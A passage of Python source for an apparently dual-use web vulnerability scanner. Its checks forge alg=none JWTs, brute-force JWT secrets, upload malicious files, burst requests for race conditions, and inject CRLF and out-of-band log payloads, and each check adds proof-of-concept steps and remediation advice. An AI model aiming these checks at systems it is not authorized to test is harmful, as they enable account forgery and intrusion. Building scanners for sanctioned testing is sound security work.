                similarity = difflib.SequenceMatcher(None, original_content, content).ratio()
                if similarity < BOOLEAN_DIFF_THRESHOLD: # If content is significantly different
                    report.add_finding(
                        "IDOR (Insecure Direct Object Reference) - Content Change",
                        f"Attempting to access '{param_name}' with value '{fuzz_value}' resulted in a 200 OK response with significantly different content compared to the original, suggesting an IDOR vulnerability.",
                        "High", "Probable",
                        f"Original Value: {original_value}\nFuzzed Value: {fuzz_value}\nResponse Status: {resp.status}\nContent Similarity: {similarity:.2f}",
                        "Implement robust authorization checks on all direct object references. Ensure users can only access resources they are explicitly authorized for.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Original value: {original_value}, Fuzzed value: {fuzz_value}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to its original value (`{escape(original_value)}`). Note the response.",
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(fuzz_value)}`",
                            "Compare the two responses. If the fuzzed request returns different, potentially sensitive information with a 200 OK, it's an IDOR."
                        ],
                        remediation_steps=[
                            "**Implement Access Control:** For every request that accesses a resource by ID, verify that the authenticated user is authorized to access *that specific* resource.",
                            "**Use Indirect References:** Instead of exposing direct object IDs (e.g., database primary keys), use per-user indirect references (e.g., a random UUID generated for each user's view of an object).",
                            "**Least Privilege:** Ensure that API endpoints and database queries enforce the principle of least privilege."
                        ]
                    )
                    return # Found, move to next parameter

            # Scenario 2: Status code change (e.g., from 403/404 to 200)
            if original_resp.status in [401, 403, 404] and resp.status == 200:
                report.add_finding(
                    "IDOR (Insecure Direct Object Reference) - Status Code Change",
                    f"Attempting to access '{param_name}' with value '{fuzz_value}' changed the response status from {original_resp.status} to {resp.status} OK, suggesting an IDOR vulnerability.",
                    "High", "Confirmed",
                    f"Original Value: {original_value}\nFuzzed Value: {fuzz_value}\nOriginal Status: {original_resp.status}\nNew Status: {resp.status}",
                    "Implement robust authorization checks on all direct object references. Ensure users can only access resources they are explicitly authorized for.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Original value: {original_value}, Fuzzed value: {fuzz_value}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to its original value (`{escape(original_value)}`). Observe the {original_resp.status} response.",
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(fuzz_value)}`",
                        f"Observe the {resp.status} response, indicating a bypass of the original access restriction."
                    ],
                    remediation_steps=[
                        "**Implement Access Control:** For every request that accesses a resource by ID, verify that the authenticated user is authorized to access *that specific* resource.",
                        "**Use Indirect References:** Instead of exposing direct object IDs (e.g., database primary keys), use per-user indirect references (e.g., a random UUID generated for each user's view of an object).",
                        "**Least Privilege:** Ensure that API endpoints and database queries enforce the principle of least privilege."
                    ]
                )
                return # Found, move to next parameter

async def check_jwt_vulnerabilities(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, cli_args: argparse.Namespace, **kwargs):
    """
    Checks for common JWT (JSON Web Token) vulnerabilities:
    1. Weak Secret Key (Brute-force/Dictionary Attack)
    2. Algorithm Confusion (alg=None)
    """
    # This check needs to identify JWTs first. JWTs are typically in Authorization headers (Bearer),
    # cookies, or sometimes in request bodies.
    # For now, we'll assume they might be in the Authorization header or a known cookie.

    jwt_candidates = []
    # Check for JWT in session headers (if login was performed or auth_header was set)
    if 'Authorization' in report.session_headers and report.session_headers['Authorization'].startswith('Bearer '):
        jwt_candidates.append(report.session_headers['Authorization'].split(' ')[1])
    # Check for JWT in auth_header CLI arg
    if cli_args.auth_header and cli_args.auth_header.lower().startswith('authorization: bearer '):
        jwt_candidates.append(cli_args.auth_header.split(' ')[2]) # "Authorization: Bearer <token>"
    # Check for JWT in auth_cookie CLI arg (less common but possible)
    if cli_args.auth_cookie:
        for cookie_part in cli_args.auth_cookie.split(';'):
            if 'jwt' in cookie_part.lower() or 'token' in cookie_part.lower():
                # Heuristic: look for 3 parts separated by dots
                if len(cookie_part.split('.')) == 3:
                    jwt_candidates.append(cookie_part.split('=')[-1])
    
    # Also check any discovered parameters that might hold a JWT
    for param_list in report.parameters_discovered.values():
        for param_info in param_list:
            if param_info['name'].lower() in ['jwt', 'token', 'auth_token', 'access_token']:
                if len(param_info['value'].split('.')) == 3:
                    jwt_candidates.append(param_info['value'])

    unique_jwt_candidates = list(set(jwt_candidates))

    if not unique_jwt_candidates:
        logger.debug(f"No JWT candidates found for {url}. Skipping JWT checks.")
        return

    for jwt_token in unique_jwt_candidates:
        try:
            # 1. Check for Algorithm Confusion (alg=None)
            # Try decoding with `verify_signature=False`
            decoded_header = jwt.get_unverified_header(jwt_token)
            if decoded_header.get("alg") == "none":
                # Attempt to create a new token with alg=none and no signature
                modified_token = jwt.encode({"test": "none_alg_attack"}, "", algorithm="none")
                
                # Try sending this modified token
                test_headers = {"Authorization": f"Bearer {modified_token}"}
                if report.session_headers: test_headers.update(report.session_headers)

                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", headers=test_headers, proxy=cli_args.proxy
                )
                if resp and resp.status == 200 and "none_alg_attack" in content: # Heuristic: check if our injected payload is reflected
                    report.add_finding(
                        "JWT Algorithm None (alg=none) Bypass",
                        "The JWT token appears vulnerable to algorithm confusion (alg=none) bypass. The server accepts tokens with 'none' algorithm, allowing an attacker to forge valid tokens without a signature.",
                        "Critical", "Confirmed",
                        f"Original JWT: {jwt_token}\nModified JWT (alg=none): {modified_token}\nResponse status: {resp.status}\nResponse snippet: {content[:500]}",
                        "Configure the JWT library to explicitly disallow the 'none' algorithm. Always verify the signature of incoming JWTs.",
                        final_url, "JWT Token", request_details=raw_req, response_details=content,
                        poc_notes=f"Original JWT: {jwt_token}\nModified JWT with alg=none: {modified_token}",
                        poc_steps=[
                            f"Capture a valid JWT token from the application.",
                            f"Decode the JWT header. Change the 'alg' field to 'none'.",
                            f"Remove the signature part of the token (the third segment).",
                            f"Send a request to `{escape(url)}` with the modified token. Observe if the request is accepted."
                        ],
                        remediation_steps=[
                            "**Disallow 'none' Algorithm:** Configure your JWT library to explicitly reject tokens with the 'none' algorithm.",
                            "**Always Verify Signature:** Ensure that all incoming JWTs are validated for their signature using the correct secret/public key.",
                            "**Use Strong Secrets:** If using symmetric keys, ensure they are long, random, and kept confidential."
                        ]
                    )
                    return # Found, move to next JWT

            # 2. Check for Weak Secret Key (Brute-force/Dictionary Attack)
            # Try decoding with common secrets
            for secret in JWT_COMMON_SECRETS:
                try:
                    jwt.decode(jwt_token, secret, algorithms=[decoded_header.get("alg", "HS256")])
                    report.add_finding(
                        "Weak JWT Secret Key",
                        f"The JWT token's secret key was successfully brute-forced using a common dictionary word: '{escape(secret)}'. This allows an attacker to forge valid tokens.",
                        "High", "Confirmed",
                        f"JWT: {jwt_token}\nDiscovered Secret: {secret}",
                        "Use a strong, long, and random secret key for signing JWTs. Rotate keys regularly. Do not hardcode secrets.",
                        url, "JWT Token",
                        poc_notes=f"JWT: {jwt_token}\nSecret found: {secret}",
                        poc_steps=[
                            f"Capture a valid JWT token from the application.",
                            f"Attempt to decode the token using common dictionary words as the secret key (e.g., using `jwt.io` or a tool like `jwt_tool`).",
                            f"If decoding is successful with a weak secret like `{escape(secret)}`, the vulnerability is confirmed."
                        ],
                        remediation_steps=[
                            "**Strong Secret Keys:** Use cryptographically strong, random, and sufficiently long secret keys (e.g., 256-bit or more).",
                            "**Key Rotation:** Implement a key rotation strategy for JWT signing keys.",
                            "**Secure Key Storage:** Store secret keys securely, not hardcoded in source code or easily accessible configuration files.",
                            "**Asymmetric Algorithms:** Consider using asymmetric (RSA/ECDSA) algorithms where a private key is used for signing and a public key for verification, reducing the risk of secret compromise."
                        ]
                    )
                    return # Found, move to next JWT
                except DecodeError:
                    pass # Incorrect secret, continue
                except InvalidTokenError:
                    pass # Invalid token structure or header, continue
                except Exception as e:
                    logger.debug(f"Error during JWT secret brute-force: {e}")

        except DecodeError as e:
            logger.debug(f"Could not decode JWT header for {jwt_token}: {e}")
        except Exception as e:
            report.add_error(f"Error during JWT analysis for {jwt_token}: {e}", url, "JWT")

async def check_directory_listing(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, **kwargs):
    """Checks for enabled directory listing."""
    # Test common directory paths
    test_paths = ["/", "/admin/", "/uploads/", "/assets/", "/css/", "/js/", "/images/"]
    for path in test_paths:
        test_url = urljoin(url, path)
        resp, content, _, final_url, _, raw_req = await fetch_url(session, concurrency_manager, test_url, headers=report.session_headers)
        if not resp or not content or not final_url: continue

        # Look for common directory listing indicators
        if resp.status == 200 and (
            "<title>Index of /" in content or
            "Directory Listing For" in content or
            "<pre><a href=\"?C=N;O=D\">Name</a>" in content or
            "Parent Directory" in content
        ):
            report.add_finding(
                "Directory Listing Enabled",
                f"Directory listing is enabled at '{final_url}', exposing file and directory structures.",
                "Low", "Confirmed",
                f"Directory listing found at {final_url}",
                "Disable directory listing on your web server. Configure the server to return a 403 Forbidden or a custom index page instead.",
                final_url, request_details=raw_req, response_details=content,
                poc_steps=[
                    f"Navigate to: `{escape(final_url)}` in a web browser.",
                    "Observe the directory contents being listed."
                ],
                remediation_steps=[
                    "**Disable Directory Listing:** Configure your web server (Apache, Nginx, IIS, etc.) to disable directory browsing or indexing.",
                    "**Use Index Files:** Ensure every directory has an appropriate index file (e.g., `index.html`, `index.php`) to be served by default."
                ]
            )
            return # Found, no need to check other paths for this URL

async def check_info_disclosure_js(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, cli_args: argparse.Namespace, **kwargs):
    """
    Analyzes JavaScript files for sensitive information disclosure (e.g., API keys, credentials).
    """
    if not url.endswith('.js'):
        logger.debug(f"Skipping JS info disclosure for non-JS URL: {url}")
        return
    if len(report.js_files_found) == 0 and url not in report.js_files_found:
        logger.debug(f"JS info disclosure check called for {url}, but it's not in discovered JS files. Skipping.")
        return # Only check explicitly discovered JS files

    logger.debug(f"Analyzing JS file for sensitive info: {url}")
    
    resp, content, _, final_url, _, raw_req = await fetch_url(session, concurrency_manager, url, proxy=cli_args.proxy, headers=report.session_headers)
    if not resp or not content or not final_url:
        report.add_error(f"Failed to fetch JS content for analysis: {url}", url, "JSInfoDisclosure")
        return
    
    if len(content) > MAX_JS_FILE_SIZE_FOR_ANALYSIS:
        logger.warning(f"Skipping JS file {url} for sensitive info analysis: too large ({len(content)} bytes).")
        return

    found_sensitive_data = []
    for data_type, pattern in SENSITIVE_DATA_REGEXES.items():
        for match in pattern.finditer(content):
            found_data = match.group(0) # The full matched string
            # Try to extract the actual value if it's a key-value pair
            if len(match.groups()) > 0:
                value = match.group(1)
            else:
                value = found_data
            
            # Simple heuristic to avoid common false positives (e.g., 'key' in a comment)
            if len(value) < 10: continue # Too short to be a real secret
            
            # Check if it's within a comment (basic check)
            if "/*" in content and "*/" in content:
                comment_start = content.find("/*")
                comment_end = content.find("*/", comment_start)
                if comment_start != -1 and comment_end != -1 and comment_start < content.find(found_data) < comment_end:
                    continue # Likely in a comment

            found_sensitive_data.append({"type": data_type, "value": value, "snippet": found_data})
            logger.info(f"Found sensitive data in JS: {data_type} in {url}")

    if found_sensitive_data:
        description = "Sensitive information (e.g., API keys, credentials) was found hardcoded or exposed in a JavaScript file, which can be accessed by attackers."
        evidence = "\n".join([f"Type: {d['type']}, Value: {d['value']}, Snippet: {d['snippet']}" for d in found_sensitive_data])
        remediation = "Remove sensitive information from client-side JavaScript files. Store secrets securely on the server-side and access them via authenticated API calls."
        remediation_steps = [
            "**Remove Hardcoded Secrets:** Never hardcode API keys, credentials, or other sensitive data directly into client-side JavaScript.",
            "**Server-Side Storage:** Store all secrets on the server-side in secure configuration files or environment variables.",
            "**Secure Access:** Access necessary sensitive data via authenticated server-side API endpoints, ensuring proper authorization.",
            "**Environment Variables:** For build processes, use environment variables to inject non-sensitive configuration, but not secrets.",
            "**Review Build Process:** Ensure your build and deployment process does not accidentally embed sensitive information into client-side bundles."
        ]
        report.add_finding("Sensitive Data Exposure in JS", description, "High", "Confirmed",
                           evidence, remediation, final_url, request_details=raw_req, response_details=content,
                           poc_notes="Sensitive data found directly in the JavaScript file.",
                           poc_steps=[
                               f"Open `{escape(final_url)}` in a web browser.",
                               "View the source code of the JavaScript file.",
                               "Search for the identified sensitive data (e.g., API key, password)."
                           ],
                           remediation_steps=remediation_steps
                           )

async def check_subdomain_takeover(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, **kwargs):
    """
    Checks for potential subdomain takeover vulnerabilities.
    This check typically runs against the target's subdomains, not the main URL,
    but can be adapted to check the main URL if it's a CNAME to a vulnerable service.
    For this version, we'll check the main target URL against common fingerprints.
    """
    parsed_url = urlparse(url)
    if not parsed_url.netloc: return

    # Check if the target URL's CNAME points to a known vulnerable service
    # This requires a DNS lookup, which aiohttp doesn't do directly.
    # We'll rely on response content fingerprints for now.

    resp, content, _, final_url, _, raw_req = await fetch_url(session, concurrency_manager, url, headers=report.session_headers)
    if not resp or not content or not final_url: return

    for service, fingerprint in SUBDOMAIN_TAKEOVER_FINGERPRINTS.items():
        if fingerprint in content:
            report.add_finding(
                "Subdomain Takeover (Potential)",
                f"The response for '{final_url}' contains a fingerprint ('{fingerprint[:50]}...') associated with a vulnerable service ({service}). This might indicate a dangling DNS record susceptible to subdomain takeover.",
                "High", "Tentative",
                f"Fingerprint '{fingerprint}' found in response for {final_url}. Service: {service}.",
                "Remove dangling DNS records or claim the associated service. Ensure all DNS entries for your domains point to active, controlled resources.",
                final_url,
                poc_notes=f"Service: {service}, Fingerprint: {fingerprint}",
                request_details=raw_req,
                response_details=content,
                poc_steps=[
                    f"Manually verify the DNS records for `{escape(urlparse(final_url).netloc)}` using `dig CNAME` or an online DNS lookup tool.",
                    f"If a CNAME record points to a service like `{escape(service)}.example.com` and the page shows the fingerprint, attempt to register a new account/resource on that service with the same name to claim it."
                ],
                remediation_steps=[
                    "**Remove Dangling DNS Records:** Identify and remove any DNS records (especially CNAMEs) that point to services or resources that are no longer active or under your control.",
                    "**Claim Unclaimed Resources:** If a service is still active but unclaimed, claim it immediately to prevent malicious actors from doing so.",
                    "**Regular DNS Audits:** Periodically audit your DNS records to ensure all entries are valid and point to legitimate resources."
                ]
            )
            return # Found, move to next URL

async def check_insecure_file_upload(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for insecure file upload vulnerabilities.
    Identifies file upload parameters and attempts to upload malicious files.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    file_upload_params = [p for p in parameters_to_test if p.get('type') == 'file' or 'file' in p['name'].lower() or 'upload' in p['name'].lower()]

    if not file_upload_params:
        logger.debug(f"No file upload parameters found for {url}. Skipping.")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    upload_payloads_to_try = random.sample(INSECURE_FILE_UPLOAD_PAYLOADS, min(payload_count, len(INSECURE_FILE_UPLOAD_PAYLOADS)))

    for param_info in file_upload_params:
        param_name = param_info['name']
        param_method = param_info['method']

        for filename, file_content in upload_payloads_to_try:
            # Prepare multipart/form-data
            data = aiohttp.FormData()
            for p in parameters_to_test:
                if p['name'] == param_name:
                    data.add_field(param_name, file_content, filename=filename, content_type='application/octet-stream')
                else:
                    data.add_field(p['name'], p['value'])

            # Add session headers to the request
            upload_headers = {}
            if report.session_headers:
                upload_headers.update(report.session_headers)
            
            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None

            # File uploads are almost always POST
            if param_method == "POST":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data, proxy=cli_args.proxy, headers=upload_headers
                )
            else:
                logger.debug(f"Skipping file upload test for non-POST method on {url}")
                continue
            
            if not resp or not content or not final_url:
                continue

            # Check for indicators of successful upload or vulnerability
            # This is highly dependent on the application's response.
            # Look for reflection of filename, direct links to uploaded file, or error messages.
            
            # Heuristic 1: Server returns 200 OK and reflects the filename in the response
            if resp.status == 200 and filename in content:
                # Attempt to access the uploaded file if a path is suggested
                # This is a complex step and often requires manual analysis or more sophisticated logic
                # For now, we'll report based on reflection and status.
                report.add_finding(
                    "Insecure File Upload (Potential)",
                    f"The file '{escape(filename)}' was uploaded and its name was reflected in the response (Status: {resp.status}), suggesting a potential insecure file upload vulnerability.",
                    "High", "Tentative",
                    f"Attempted to upload '{filename}' with content '{file_content[:50]}...'. Filename reflected in response.",
                    "Implement strict file type validation (whitelist), content validation, and store uploaded files outside the web root with randomized names. Disable script execution in upload directories.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Attempted upload of {filename}. Check for direct access to the uploaded file.",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, data, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, data, raw_req)[1],
                    poc_steps=[
                        f"Identify a file upload field on {escape(url)}.",
                        f"Attempt to upload a file named `{escape(filename)}` with malicious content.",
                        "Observe the server's response for indications of successful upload or errors. Manually try to access the uploaded file."
                    ],
                    remediation_steps=[
                        "**Strict File Type Validation (Whitelist):** Only allow specific, safe file extensions (e.g., `.jpg`, `.png`, `.pdf`). Never rely solely on MIME type.",
                        "**Content Validation:** Analyze the file content to ensure it matches the expected file type (e.g., check magic bytes).",
                        "**Rename Files:** Store uploaded files with randomized, unguessable names to prevent direct access.",
                        "**Store Outside Web Root:** Store uploaded files in a directory that is not directly accessible via the web server.",
                        "**Disable Script Execution:** Configure the upload directory to explicitly disable script execution."
                    ]
                )
                return # Found, move to next parameter

async def check_race_condition(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for race condition vulnerabilities by sending multiple concurrent requests
    to a sensitive endpoint within a short time window.
    """
    # This check is most effective on endpoints that perform state changes,
    # e.g., purchasing items, applying discounts, changing passwords.
    # It's hard to automatically identify "sensitive" endpoints without context.
    # For now, we'll run it on all discovered URLs with parameters.

    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for Race Condition check on {url}. Skipping.")
        return

    # Use the original parameters for the race condition test
    original_params = {p['name']: p['value'] for p in parameters_to_test}
    
    logger.debug(f"Testing for race condition on {url} with {RACE_CONDITION_REQUEST_BURST} requests.")

    responses = []
    tasks = []

    async def send_single_request():
        # Use a copy of session headers for each request
        request_headers = report.session_headers.copy()
        
        # Race conditions often rely on POST requests, but we'll try GET too if applicable
        method = "POST" if any(p['method'] == "POST" for p in parameters_to_test) else "GET"
        data_to_send = original_params if method == "POST" else None
        params_to_send = original_params if method == "GET" else None

        resp, content, headers, final_url, duration, raw_req = await fetch_url(
            session, concurrency_manager, url, method=method, params=params_to_send, data=data_to_send,
            proxy=cli_args.proxy, headers=request_headers
        )
        if resp and content:
            responses.append({"status": resp.status, "content_len": len(content), "content": content, "headers": headers, "duration": duration, "raw_req": raw_req})
        else:
            responses.append({"status": None, "content_len": 0, "content": None, "headers": None, "duration": duration, "raw_req": raw_req})

    start_time = time.monotonic()
    # Create and run multiple tasks concurrently
    for _ in range(RACE_CONDITION_REQUEST_BURST):
        tasks.append(send_single_request())
    
    # Wait for all tasks to complete within the window
    try:
        await asyncio.wait_for(asyncio.gather(*tasks), timeout=RACE_CONDITION_WINDOW_MS / 1000)
    except asyncio.TimeoutError:
        logger.debug(f"Race condition burst on {url} timed out after {RACE_CONDITION_WINDOW_MS}ms.")
    except Exception as e:
        report.add_error(f"Error during race condition test on {url}: {e}", url, "RaceCondition")
        return

    end_time = time.monotonic()
    actual_window = end_time - start_time

    # Analyze responses for race condition indicators
    # This is highly application-specific. Look for:
    # 1. Inconsistent responses (e.g., some 200 OK, some 403, some 500)
    # 2. Unexpected state changes (hard to detect automatically without prior knowledge)
    # 3. Success messages beyond what's expected for a single valid request
    
    successful_responses = [r for r in responses if r['status'] == 200]
    error_responses = [r for r in responses if r['status'] and r['status'] >= 400]

    if len(successful_responses) > 1 and len(error_responses) > 0:
        # Heuristic: If multiple successes and some errors, could indicate race condition
        # where some requests succeeded before a resource was depleted/locked.
        report.add_finding(
            "Race Condition (Potential)",
            f"Multiple concurrent requests to '{url}' resulted in a mix of successful ({len(successful_responses)}) and error ({len(error_responses)}) responses within {actual_window:.2f}s. This pattern can indicate a race condition.",
            "Medium", "Tentative",
            f"Sent {RACE_CONDITION_REQUEST_BURST} requests. Successful: {len(successful_responses)}, Errors: {len(error_responses)}.",
            "Implement proper locking mechanisms, transactions, or unique constraints for sensitive operations to prevent race conditions. Ensure server-side logic handles concurrent requests safely.",
            url, parameter="Multiple Parameters",
            poc_notes=f"Sent {RACE_CONDITION_REQUEST_BURST} requests concurrently.",
            curl_poc="N/A (requires concurrent requests)",
            python_poc="N/A (requires concurrent requests)",
            poc_steps=[
                f"Identify a sensitive endpoint on {escape(url)} (e.g., purchase, discount application, password change).",
                f"Use a tool (e.g., Burp Suite Intruder, custom script) to send {RACE_CONDITION_REQUEST_BURST} identical requests to this endpoint simultaneously or within a very short time window (e.g., {RACE_CONDITION_WINDOW_MS}ms).",
                "Observe the responses for inconsistent behavior, such as multiple successful outcomes where only one should occur, or a mix of success and failure."
            ],
            remediation_steps=[
                "**Implement Locking Mechanisms:** Use database locks, distributed locks (e.g., Redis locks), or application-level mutexes to ensure only one request can modify a critical resource at a time.",
                "**Transactions:** Wrap sensitive operations within database transactions to ensure atomicity.",
                "**Unique Constraints:** Apply unique constraints in the database to prevent duplicate entries for critical data.",
                "**Idempotent Operations:** Design API endpoints to be idempotent where possible, meaning repeated calls have the same effect as a single call.",
                "**Rate Limiting:** Implement server-side rate limiting to control the number of requests a user can make within a given time period."
            ]
        )
        return

    # More advanced race condition detection would involve analyzing specific response content for state changes.
    # E.g., if an item's quantity decreases by 1 for each successful request, but we got multiple successes.
    # This is highly application-specific and difficult to generalize.

async def check_excessive_data_exposure(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, **kwargs):
    """
    Checks for excessive data exposure by analyzing JSON responses for sensitive keys.
    This check is most effective on API endpoints.
    """
    # This check will run on all crawled URLs, but will primarily focus on JSON responses
    # as they are common for APIs.

    resp, content, headers, final_url, _, raw_req = await fetch_url(session, concurrency_manager, url, headers=report.session_headers)
    if not resp or not content or not final_url: return

    # Check if the response is JSON
    content_type = headers.get('Content-Type', '').lower()
    if 'application/json' not in content_type and 'text/json' not in content_type:
        logger.debug(f"Skipping Excessive Data Exposure for non-JSON response on {url}.")
        return

    try:
        json_data = json.loads(content)
    except json.JSONDecodeError:
        logger.debug(f"Could not parse JSON for Excessive Data Exposure on {url}.")
        return

    sensitive_keys = [
        "password", "pwd", "secret", "token", "api_key", "private_key",
        "ssn", "credit_card", "cc_num", "cvv", "security_code", "bank_account",
        "address", "phone", "email", "dob", "date_of_birth", "national_id",
        "internal_id", "db_password", "connection_string", "admin_credentials",
        "session_id", "jwt_token", "refresh_token", "access_token", "bearer_token"
    ]
    
    exposed_keys = set()

    def find_sensitive_keys(obj):
        if isinstance(obj, dict):
            for key, value in obj.items():
                if isinstance(key, str) and key.lower() in sensitive_keys:
                    exposed_keys.add(key)
                find_sensitive_keys(value) # Recurse for nested dicts/lists
        elif isinstance(obj, list):
            for item in obj:
                find_sensitive_keys(item)

    find_sensitive_keys(json_data)

    if exposed_keys:
        report.add_finding(
            "Excessive Data Exposure",
            f"The endpoint '{final_url}' exposes sensitive data keys ({', '.join(exposed_keys)}) in its JSON response that might not be necessary for the client. This can lead to unintended information disclosure.",
            "Medium", "Probable",
            f"Sensitive keys found in JSON response: {', '.join(exposed_keys)}.\nResponse snippet: {content[:500]}",
            "Review API responses and remove any data that is not explicitly required by the client. Implement strict data filtering on the server-side.",
            final_url,
            poc_notes=f"Sensitive keys: {', '.join(exposed_keys)}",
            request_details=raw_req, response_details=content,
            poc_steps=[
                f"Send a request to `{escape(final_url)}`.",
                "Inspect the JSON response for sensitive keys (e.g., 'password', 'credit_card', 'internal_id')."
            ],
            remediation_steps=[
                "**Data Minimization:** Only return the absolute minimum data required by the client. Avoid sending entire database records or internal objects.",
                "**Server-Side Filtering:** Implement robust server-side filtering and serialization to explicitly select which fields are sent in API responses.",
                "**Role-Based Access Control (RBAC):** Ensure that different user roles receive different sets of data based on their permissions.",
                "**Avoid Generic Serialization:** Do not rely on default ORM or framework serialization that might expose all fields by default."
            ]
        )
        return

async def check_log_injection(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, interactsh_client: Optional[InteractshClient], **kwargs):
    """
    Checks for Log Injection vulnerabilities by injecting newline characters and markers
    into parameters, then looking for reflection or OOB interaction.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for Log Injection check on {url}")
        return

    # Payloads for log injection (newline characters, followed by a marker)
    log_injection_payloads = [
        "%0aMG_LOG_INJECT_TEST", # Newline
        "%0d%0aMG_LOG_INJECT_TEST", # CRLF
        "\\nMG_LOG_INJECT_TEST", # Literal \n
        "\\r\\nMG_LOG_INJECT_TEST", # Literal \r\n
    ]
    if interactsh_client:
        unique_oob_id = str(uuid.uuid4())
        oob_payload = interactsh_client.get_oob_payload(f"%0aMG_LOG_OOB_TEST_{unique_oob_id}.{{INTERACTSH_DOMAIN}}")
        log_injection_payloads.append(oob_payload)

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    payloads_to_try = random.sample(log_injection_payloads, min(payload_count, len(log_injection_payloads)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = original_value + payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for OOB interaction if an OOB payload was used
            if "MG_LOG_OOB_TEST" in payload and interactsh_client:
                interaction = interactsh_client.check_for_interaction(unique_oob_id)
                if interaction:
                    report.add_finding(
                        "Log Injection (OOB)",
                        f"An Out-of-Band (OOB) interaction was detected, indicating a log injection vulnerability. The payload '{escape(payload)}' likely caused the server to log an arbitrary string that triggered an OOB request.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nOOB Interaction: {json.dumps(interaction, indent=2)}",
                        "Sanitize and validate all user input before logging it. Prevent newline characters from being injected into log entries.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload: {payload}\nInteractsh ID: {unique_oob_id}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        oob_interaction=interaction,
                        poc_steps=[
                            f"Configure an Interactsh client (e.g., `interactsh-client -s {interactsh_client.interactsh_server}`).",
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                            f"Monitor your Interactsh client for an incoming interaction containing `{unique_oob_id}`."
                        ],
                        remediation_steps=[
                            "**Input Sanitization:** Sanitize all user-controlled input before it is written to log files.",
                            "**Encode Newlines:** Encode or filter out newline characters (`\\n`, `\\r`) from log entries.",
                            "**Structured Logging:** Use structured logging formats (e.g., JSON) which separate data fields, making injection into log format less likely.",
                            "**Least Privilege for Log Access:** Restrict access to log files to authorized personnel and systems."
                        ]
                    )
                    return # Found, move to next parameter

            # Check for reflection (less reliable for log injection, but possible)
            if "MG_LOG_INJECT_TEST" in content:
                report.add_finding(
                    "Log Injection (Reflected)",
                    f"The log injection marker 'MG_LOG_INJECT_TEST' was reflected in the response for payload '{escape(payload)}' injected into parameter '{param_name}'. This suggests that the input is logged and then reflected, potentially leading to log poisoning or other issues.",
                    "Medium", "Tentative",
                    f"Payload: {payload}\nResponse snippet: {content[:500]}",
                    "Sanitize and validate all user input before logging it. Prevent newline characters from being injected into log entries.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {payload}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
